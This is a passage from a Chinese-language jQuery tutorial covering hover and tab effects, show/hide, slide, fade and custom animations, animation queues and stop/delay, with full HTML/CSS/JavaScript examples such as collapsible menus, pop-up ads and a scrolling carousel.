1px dashed #cccccc; &#125; ul li:nth-child(-n+3) span &#123; background: deeppink; &#125; ul li span &#123; display: inline-block; width: 20px; height: 20px; background: #cccccc; text-align: center; line-height: 20px; margin-right: 10px; &#125; .content &#123; overflow: hidden; margin-top: 5px; display: none; &#125; .content img &#123; width: 80px; height: 120px; float: left; &#125; .content p &#123; width: 180px; height: 120px; float: right; font-size: 12px; line-height: 20px; &#125; .current .content &#123; display: block; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // 1.监听li的移出事件 // $('li').mouseenter(function () &#123; // $(this).addClass('current'); // &#125;); // 2.监听li的移出事件 // $('li').mouseleave(function () &#123; // $(this).removeClass('current'); // &#125;); // 使用hover监听li的移入移出事件 $('li').hover(function () &#123; $(this).addClass('current'); &#125;, function () &#123; $(this).removeClass('current'); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="box"&gt; &lt;h1&gt;电影排行榜&lt;/h1&gt; &lt;ul&gt; &lt;li&gt;&lt;span&gt;1&lt;/span&gt;电影名称 &lt;div class="content"&gt; &lt;img src="images/3.jpg" alt=""&gt; &lt;p&gt;这是一段文字介绍这是一段文字介绍这是一段文字介绍这是一段文字介绍这是一段文字介绍 这是一段文字介绍这是一段文字介绍这是一段文字介绍 &lt;/p&gt; &lt;/div&gt; &lt;/li&gt; &lt;li&gt;&lt;span&gt;2&lt;/span&gt;电影名称 &lt;div class="content"&gt; &lt;img src="images/3.jpg" alt=""&gt; &lt;p&gt;这是一段文字介绍这是一段文字介绍这是一段文字介绍这是一段文字介绍这是一段文字介绍 这是一段文字介绍这是一段文字介绍这是一段文字介绍 &lt;/p&gt; &lt;/div&gt; &lt;/li&gt; &lt;li&gt;&lt;span&gt;3&lt;/span&gt;电影名称 &lt;div class="content"&gt; &lt;img src="images/3.jpg" alt=""&gt; &lt;p&gt;这是一段文字介绍这是一段文字介绍这是一段文字介绍这是一段文字介绍这是一段文字介绍 这是一段文字介绍这是一段文字介绍这是一段文字介绍 &lt;/p&gt; &lt;/div&gt; &lt;/li&gt; &lt;li&gt;&lt;span&gt;4&lt;/span&gt;电影名称 &lt;div class="content"&gt; &lt;img src="images/3.jpg" alt=""&gt; &lt;p&gt;这是一段文字介绍这是一段文字介绍这是一段文字介绍这是一段文字介绍这是一段文字介绍 这是一段文字介绍这是一段文字介绍这是一段文字介绍 &lt;/p&gt; &lt;/div&gt; &lt;/li&gt; &lt;li&gt;&lt;span&gt;5&lt;/span&gt;电影名称 &lt;div class="content"&gt; &lt;img src="images/3.jpg" alt=""&gt; &lt;p&gt;这是一段文字介绍这是一段文字介绍这是一段文字介绍这是一段文字介绍这是一段文字介绍 这是一段文字介绍这是一段文字介绍这是一段文字介绍 &lt;/p&gt; &lt;/div&gt; &lt;/li&gt; &lt;li&gt;&lt;span&gt;6&lt;/span&gt;电影名称 &lt;div class="content"&gt; &lt;img src="images/3.jpg" alt=""&gt; &lt;p&gt;这是一段文字介绍这是一段文字介绍这是一段文字介绍这是一段文字介绍这是一段文字介绍 这是一段文字介绍这是一段文字介绍这是一段文字介绍 &lt;/p&gt; &lt;/div&gt; &lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;狼性法则：要培养学生超强的学习能力，一定要培养学生对于客观世界的好奇心，用兴趣来作为他学习的老师。这样的学生在未来的人生道路上，就能不断对工作有新创建和新灵感Tab选项卡：鼠标移动到哪个选项卡就显示哪个选项卡对应的图片1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;37-Tab选项卡下&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; .box &#123; width: 440px; height: 298px; border: 1px solid black; margin: 50px auto; &#125; .nav li &#123; list-style: none; width: 110px; height: 50px; background: orange; text-align: center; line-height: 50px; float: left; &#125; .nav .current &#123; background: #cccccc; &#125; .content li &#123; list-style: none; display: none; &#125; .content .show &#123; display: block; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // 1.监听选项卡的移入事件 $('.nav li').mouseenter(function () &#123; // 1.1 $(this).addClass('current'); // 1.2还原其他兄弟选项卡的背景颜色 $(this).siblings().removeClass('current'); // 1.3获取当前选项卡的索引 var index = $(this).index(); // 1,4根据索引找到对应的图片 var $li = $('.content li').eq(index); // 1.5隐藏非当前索引的其他图片 $li.siblings().removeClass('show'); // 1.6显示当前对应图片 $li.addClass('show'); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="box"&gt; &lt;ul class="nav"&gt; &lt;li class="current"&gt;HTML+CSS&lt;/li&gt; &lt;li&gt;jQuery&lt;/li&gt; &lt;li&gt;C语言&lt;/li&gt; &lt;li&gt;Go语言&lt;/li&gt; &lt;/ul&gt; &lt;ul class="content"&gt; &lt;li class="show"&gt;&lt;img src="images/4-1.jpg" alt=""&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="images/4-2.jpg" alt=""&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="images/4-3.jpg" alt=""&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="images/4-4.jpg" alt=""&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;鼠标移入到哪个序号就显示哪个序号对应图片123456789101112131415&lt;script type="text/javascript"&gt; $(function () &#123; // 1.监听索引移入事件 $(".index&gt;li").mouseenter(function () &#123; // 2.给移入的索引添加背景,其它索引删除背景 $(this).addClass("cur").siblings().removeClass("cur"); // 3.找到当前移入索引的序号 var $idx = $(this).index(); // 4.找到序号对应的图片 var $li = $(".content&gt;li").eq($idx); // 5.显示对应图片,并且让其它图片小事 $li.addClass("show").siblings().removeClass("show"); &#125;); &#125;);&lt;/script&gt;八、动画效果1.显示、隐藏动画[show(s,[e],[fn]])显示动画内部实现原理根据当前操作的元素是块级还是行内决定, 块级内部调用display:block;,行内内部调用display:inline;[hide(s,[e],[fn]])隐藏动画toggle([spe],[eas],[fn])切换动画(显示变隐藏,隐藏变显示)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; div &#123; width: 200px; height: 200px; background: red; display: none; &#125; &lt;/style&gt; &lt;title&gt;39-jQuery显示隐藏动画&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; $('button').eq(0).click(function () &#123; // $('div').css('display', 'block'); // 动画效果，单位毫秒，回调函数:动画执行完毕之后调用 $('div').show(1000, function () &#123; alert('显示动画执行完毕'); &#125;); &#125;); $('button').eq(1).click(function () &#123; // $('div').css('display', 'none'); $('div').hide(1000, function () &#123; alert('隐藏动画执行完毕'); &#125;); &#125;); $('button').eq(2).click(function () &#123; $('div').toggle(1000, function () &#123; alert('切换动画执行完毕'); &#125;); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button&gt;显示&lt;/button&gt;&lt;button&gt;隐藏&lt;/button&gt;&lt;button&gt;切换&lt;/button&gt;&lt;div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;注意事项:show(1000, function () {};) 第一个参数单位是毫秒, 1000毫秒等于1秒默认的动画时长是400毫秒除了指定毫秒以外还可以指定三个预设参数 slow、normal、fastslow本质是600毫秒normal本质是400毫秒fast本质是200毫秒其它两个方法同理可证对联广告：页面滚动显示123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;40-对联广告&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; .left &#123; float: left; position: fixed; left: 0; top: 200px; &#125; .right &#123; float: right; position: fixed; right: 0; top: 200px; &#125; img &#123; width: 200px; display: none; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // 1.监听网页滚动 $(window).scroll(function () &#123; // console.log("网页滚动了"); // console.log($("html,body").scrollTop()); // 1.1获取网页滚动的偏移位 var offset = $("html,body").scrollTop(); if (offset &gt; 500) &#123; // 1.3显示广告 $('img').show(1000); &#125; else &#123; $('img').hide(1000); &#125; &#125;) &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;img src="images/5.jpg" alt="" class="left"&gt;&lt;img src="images/5.jpg" alt="" class="right"&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;....&lt;!-- 还有很多`&lt;br/&gt;`，目的是页面上出现滚动条--&gt;&lt;/body&gt;&lt;/html&gt;2. 展开、收起动画参数、注意事项和显示隐藏动画一模一样, 只不过动画效果不一样而已slideDown([s],[e],[fn])展开动画[slideUp(s,[e],[fn]])收起动画slideToggle([s],[e],[fn])切换动画(展开变收起,收起变展开)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;41-jQuery展开和收起动画&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; div &#123; width: 100px; height: 300px; background: red; display: none; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; $('button').eq(0).click(function () &#123; $('div').slideDown(1000, function () &#123; alert('展开完毕') &#125;); &#125;); $('button').eq(1).click(function () &#123; $('div').slideUp(1000, function () &#123; alert('收起完毕') &#125;); &#125;); $('button').eq(2).click(function () &#123; $('div').slideToggle(1000, function () &#123; alert('切换完毕') &#125;); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button&gt;展开&lt;/button&gt;&lt;button&gt;收起&lt;/button&gt;&lt;button&gt;切换&lt;/button&gt;&lt;div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;练习：折叠菜单123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; .nav &#123; list-style: none; width: 300px; margin: 100px auto; /*border: 1px solid #000000;*/ &#125; .nav &gt; li &#123; border: 1px solid #000000; line-height: 35px; border-bottom: none; text-indent: 2em; position: relative; &#125; /*注意：此处一定要使用&gt;来表示特定的子元素*/ .nav &gt; li:last-child &#123; border-bottom: 1px solid #000000; border-bottom-right-radius: 10px; border-bottom-left-radius: 10px; &#125; /*注意：此处一定要使用&gt;来表示特定的子元素*/ .nav &gt; li:first-child &#123; border-top-right-radius: 10px; border-top-left-radius: 10px; &#125; .nav &gt; li &gt; span &#123; /*此处是向右箭头的图片*/ background: url("images/arrow-right.jpg") no-repeat center center; display: inline-block; width: 32px; height: 32px; position: absolute; right: 10px; top: 3px; &#125; .sub &#123; display: none; &#125; .sub &gt; li &#123; list-style: none; background: mediumpurple; border-bottom: 1px solid white; &#125; .sub &gt; li:hover &#123; background: red; &#125; .nav &gt; .current &gt; span &#123; transform: rotate(90deg); &#125; &lt;/style&gt; &lt;title&gt;43-折叠菜单下&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // 1.监听一级菜单点击事件 $(".nav&gt;li").click(function () &#123; // 1.1 拿到二级菜单 var $sub = $(this).children('.sub'); // 1.2 让二级菜单展开 $sub.slideDown(1000); // 1.3 拿到所有非当前的二级菜单 var otherSub = $(this).siblings().children('.sub'); // 1.4 让所有非当前的二级菜单收起 otherSub.slideUp(1000); // 1.5 让被点击的一级菜单箭头朝下 $(this).addClass('current'); // 1.6 让所有非被点击的一级菜单箭头还原 $(this).siblings().removeClass('current'); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;ul class="nav"&gt; &lt;li&gt;一级菜单&lt;span&gt;&lt;/span&gt; &lt;ul class="sub"&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;一级菜单&lt;span&gt;&lt;/span&gt; &lt;ul class="sub"&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;一级菜单&lt;span&gt;&lt;/span&gt; &lt;ul class="sub"&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;一级菜单&lt;span&gt;&lt;/span&gt; &lt;ul class="sub"&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;一级菜单&lt;span&gt;&lt;/span&gt;&lt;/li&gt; &lt;li&gt;一级菜单&lt;span&gt;&lt;/span&gt;&lt;/li&gt; &lt;li&gt;一级菜单&lt;span&gt;&lt;/span&gt;&lt;/li&gt; &lt;li&gt;一级菜单&lt;span&gt;&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;练习：下拉菜单12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;44-下拉菜单&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; .nav &#123; list-style: none; width: 300px; height: 50px; background: red; margin: 100px auto; &#125; .nav &gt; li &#123; width: 100px; height: 50px; line-height: 50px; text-align: center; float: left; &#125; .sub &#123; list-style: none; background: mediumaquamarine; display: none; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; /* * 在jQuery中如果需要执行动画，建议在执行动画之前先调用stop方法，然后再执行动画 * */ // 1.监听一级菜单的移入事件 $('.nav&gt;li').mouseenter(function () &#123; // 1.1 拿到二级菜单 $sub = $(this).children('.sub'); // 停止当前正在运行的动画 $sub.stop(); // 1.2 展开二级菜单 $sub.slideDown(1000); &#125;); // 2.监听一级菜单的移除事件 $('.nav&gt;li').mouseleave(function () &#123; // 2.1 拿到二级菜单 $sub = $(this).children('.sub'); // 停止当前正在运行的动画 $sub.stop(); // 2.2 展开二级菜单 $sub.slideUp(1000); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;ul class="nav"&gt; &lt;li&gt;一级菜单 &lt;ul class="sub"&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;li&gt;二级菜单&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;一级菜单&lt;/li&gt; &lt;li&gt;一级菜单&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;3. 淡入、淡出动画参数、注意事项和显示隐藏动画一模一样, 只不过动画效果不一样而已fadeIn([s],[e],[fn])淡入动画fadeOut([s],[e],[fn])淡出动画[fadeToggle(s,[e],[fn]])切换动画(显示变淡出,不显示变淡入)[fadeTo([s],o,[e],[fn]])淡入到指定透明度动画可以通过第二个参数,淡入到指定的透明度(取值范围0~1)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;45-jQuery淡入淡出动画&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; div &#123; width: 100px; height: 100px; background: red; display: none; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; $('button').eq(0).click(function () &#123; $('div').fadeIn(1000, function () &#123; alert('淡入完毕'); &#125;); &#125;); $('button').eq(1).click(function () &#123; $('div').fadeOut(1000, function () &#123; alert('淡出完毕'); &#125;); &#125;); $('button').eq(2).click(function () &#123; $('div').fadeToggle(1000, function () &#123; alert('切换完毕'); &#125;); &#125;); $('button').eq(3).click(function () &#123; // 第二个参数表示淡入淡出的程度,范围0~1 $('div').fadeTo(1000, 0.5, function () &#123; alert('切换完毕'); &#125;); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button&gt;淡入&lt;/button&gt;&lt;button&gt;淡出&lt;/button&gt;&lt;button&gt;切换&lt;/button&gt;&lt;button&gt;淡入到&lt;/button&gt;&lt;div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;练习：弹窗广告123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;46-弹窗广告&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; .ad &#123; position: fixed; right: 0; bottom: 0; display: none; &#125; .ad &gt; span &#123; display: inline-block; width: 30px; height: 30px; /*background: red;*/ position: absolute; top: 0; right: 0; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; //1.监听span的监听事件 $('span').click(function () &#123; $(".ad").remove(); &#125;); // 2.执行广告动画 // $('.ad').slideDown(1000,function () &#123; // $('.ad').fadeOut(1000,function () &#123; // $('.ad').fadeIn(1000); // &#125;); // &#125;); // 链式写法 $('.ad').stop().slideDown(1000).fadeOut(1000).fadeIn(1000); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="ad"&gt; &lt;img src="images/ad-pic.jpg" alt=""&gt; &lt;span&gt;&lt;/span&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;4. 自定义动画有时候jQuery中提供的集中简单的固定动画无法满足我们的需求, 所以jQuery还提供了一个自定义动画方法来满足我们复杂多变的需求animate(p,[s],[e],[fn])每次开始运动都必须是初始位置或者初始状态,如果想在上一次位置或者状态下再次进行动画可以使用累加动画同时操作多个属性,自定义动画会执行同步动画,多个被操作的属性一起执行动画12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;47-jQuery自定义动画&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; div &#123; width: 100px; height: 100px; margin-top: 10px; background: red; &#125; .two &#123; background: blue; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; $('button').eq(0).click(function () &#123; /* $('.one').animate(&#123; width: 500, &#125;, 1000, function () &#123; alert('自定义动画执行完毕'); &#125;); */ $('.one').animate(&#123; marginLeft: 500, &#125;, 5000, function () &#123; alert('自定义动画执行完毕'); &#125;); /* * 第一个参数：接收一个对象，可以在对象中修改属性 * 第二个参数：指定动画时长 * 第三个参数：指定动画节奏，默认是swing * 第四个参数：指定动画执行完毕之后的回调函数 * */ $('.two').animate(&#123; marginLeft: 500, &#125;, 5000, 'linear', function () &#123; alert('自定义动画执行完毕'); &#125;); &#125;); $('button').eq(1).click(function () &#123; $('.one').animate(&#123; // 字符串，表示在原有基础上进行累加 width: '+=100' &#125;, 1000, function () &#123; alert('自定义动画执行完毕'); &#125;); &#125;); $('button').eq(2).click(function () &#123; $('.one').animate(&#123; // 字符串，hide：隐藏，toggle：切换 width: 'toggle' &#125;, 1000, function () &#123; alert('自定义动画执行完毕'); &#125;); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button&gt;操作属性&lt;/button&gt;&lt;button&gt;累加属性&lt;/button&gt;&lt;button&gt;关键字&lt;/button&gt;&lt;div class="one"&gt;&lt;/div&gt;&lt;div class="two"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;练习：图标特效12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;49-图标特效&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; ul &#123; list-style: none; width: 400px; height: 250px; border: 1px solid #000000; margin: 100px auto; &#125; ul &gt; li &#123; width: 100px; height: 50px; margin-top: 50px; text-align: center; float: left; overflow: hidden; &#125; ul &gt; li &gt; span &#123; display: inline-block; width: 24px; height: 24px; background: url("images/1.jpg") no-repeat 0 0; position: relative; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // 1.遍历所有的li $('li').each(function (index, value) &#123; // 1.1生成新的图片位置 var $url = 'background: url("images/1.jpg") no-repeat 0' + (index * -24) + 'px'; // 1.2设置新的图片位置 $(this).children('span').css("background", $url); &#125;); // 2.监听li移入事件 $('li').mouseenter(function () &#123; // 2.1将图片往上移动 $(this).children('span').animate(&#123; top: -50 &#125;, 1000, function () &#123; // 2.2将图片往下移动 $(this).css('top', '50px'); // 2.3将图片复位 $(this).animate(&#123; top: 0 &#125;, 1000); &#125;) &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;ul&gt; &lt;li&gt;&lt;span&gt;&lt;/span&gt; &lt;p&gt;百度&lt;/p&gt;&lt;/li&gt; &lt;li&gt;&lt;span&gt;&lt;/span&gt; &lt;p&gt;百度&lt;/p&gt;&lt;/li&gt; &lt;li&gt;&lt;span&gt;&lt;/span&gt; &lt;p&gt;百度&lt;/p&gt;&lt;/li&gt; &lt;li&gt;&lt;span&gt;&lt;/span&gt; &lt;p&gt;百度&lt;/p&gt;&lt;/li&gt; &lt;li&gt;&lt;span&gt;&lt;/span&gt; &lt;p&gt;百度&lt;/p&gt;&lt;/li&gt; &lt;li&gt;&lt;span&gt;&lt;/span&gt; &lt;p&gt;百度&lt;/p&gt;&lt;/li&gt; &lt;li&gt;&lt;span&gt;&lt;/span&gt; &lt;p&gt;百度&lt;/p&gt;&lt;/li&gt; &lt;li&gt;&lt;span&gt;&lt;/span&gt; &lt;p&gt;百度&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;5. 动画队列多个动画方法链式编程,会等到前面的动画执行完毕再依次执行后续动画1234567$(&quot;div&quot;).slideDown(1000).slideUp(1000).show(1000);$(&quot;.one&quot;).slideDown(1000,function () &#123; $(&quot;.one&quot;).slideUp(1000, function () &#123; $(&quot;.one&quot;).show(1000); &#125;);&#125;);但是如果后面紧跟一个非动画方法则会被立即执行12// 立刻变为黄色,然后再执行动画$(&quot;.one&quot;).slideDown(1000).slideUp(1000).show(1000).css(&quot;background&quot;, &quot;yellow&quot;);如果想颜色再动画执行完毕之后设置, 1.使用回调 2.使用动画队列1234567891011$(&quot;.one&quot;).slideDown(1000,function () &#123; $(&quot;.one&quot;).slideUp(1000, function () &#123; $(&quot;.one&quot;).show(1000, function () &#123; $(&quot;.one&quot;).css(&quot;background&quot;, &quot;yellow&quot;) &#125;); &#125;);&#125;);$(&quot;.one&quot;).slideDown(1000).slideUp(1000).show(1000).queue(function () &#123; $(&quot;.one&quot;).css(&quot;background&quot;, &quot;yellow&quot;)&#125;);注意点:动画队列方法queue()后面不能继续直接添加queue()如果想继续添加必须在上一个queue()方法中next()方法123456$(&quot;.one&quot;).slideDown(1000).slideUp(1000).show(1000).queue(function (next) &#123; $(&quot;.one&quot;).css(&quot;background&quot;, &quot;yellow&quot;); next(); // 关键点&#125;).queue(function () &#123; $(&quot;.one&quot;).css(&quot;width&quot;, &quot;500px&quot;)&#125;);6. 动画相关方法delay(d,[q])设置动画延迟时长stop([c],[j])停止指定元素上正在执行的动画123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; .one &#123; width: 100px; height: 100px; background: red; &#125; .two &#123; width: 500px; height: 10px; background: blue; &#125; &lt;/style&gt; &lt;title&gt;48-jQuery的stop和delay方法&lt;/title&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; $('button').eq(0).click(function () &#123; // 在jQuery的&#123;&#125;中可以同时修改多个属性，中间用逗号隔开，多个属性的动画会同时执行 /* $('.one').animate(&#123; width: 500, height: 500 &#125;, 1000); */ // 分开写可以分别执行 /* $('.one').animate(&#123; width: 500 &#125;, 1000); $('.one').animate(&#123; height: 500 &#125;, 1000); */ // 使用链式写法 // delay方法的作用就是用于高速系统延迟时长 $('.one').animate(&#123; width: 500 &#125;, 1000).delay(2000).animate(&#123; height: 500 &#125;, 1000).animate(&#123;width: 100&#125;, 1000).animate(&#123;height: 100&#125;, 1000); &#125;); $('button').eq(1).click(function () &#123; // 立即停止当前动画，继续执行后续动画 // $('div').stop(); // $('div').stop(false); // $('div').stop(false,false); // 立即停止当前动画和后续所有动画 // $('div').stop(true); // $('div').stop(true,false); // 立即完成当前的，继续执行后续动画 // $('div').stop(false,true); // 立即完成当前的，并且停止后续所有的 $('div').stop(true, true); &#125;); &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button&gt;开始动画&lt;/button&gt;&lt;button&gt;停止动画&lt;/button&gt;&lt;div class="one"&gt;&lt;/div&gt;&lt;div class="two"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;练习：无限循环滚动1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;51-无限循环滚动下&lt;/title&gt; &lt;style type="text/css"&gt; * &#123; margin: 0; padding: 0; &#125; div &#123; width: 600px; height: 161px; border: 1px solid #000000; margin: 100px auto; overflow: hidden; &#125; ul &#123; list-style: none; width: 1800px; height: 161px; background: black; &#125; ul &gt; li &#123; float: left; &#125; &lt;/style&gt; &lt;script type="text/javascript" src="js/jquery-1.11.1.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(function () &#123; // 0.定义变量保存偏移位 var offset = 0; // 1.让图片滚动起来 var timer; function autoPlay() &#123; timer = setInterval(function () &#123; offset += -10; if (offset &lt;= -1200) &#123; offset = 0; &#125; $('ul').css('marginLeft', offset) &#125;, 50); &#125; autoPlay(); // 2.监听li的移入和移出事件 $('li').hover(function () &#123; // 停止滚动 clearInterval(timer); // 给非当前选中的添加蒙版 $(this).siblings().fadeTo(100, 0.5); // 去除当前选中蒙版 $(this).fadeTo(100, 1) &#125;, function () &#123; // 继续滚动 autoPlay(); // 去除所有蒙版 $('li').fadeTo(100, 1); &#125;) &#125;); &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt; &lt;ul&gt; &lt;li&gt;&lt;img src="images/a.jpg" alt=""&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="images/b.jpg" alt=""&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="images/c.jpg" alt=""&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="images/d.jpg" alt=""&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="images/a.jpg" alt=""&gt;&lt;/li&gt; &lt;li&gt;&lt;img src="images/b.jpg" alt=""&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;九、文档处理1. 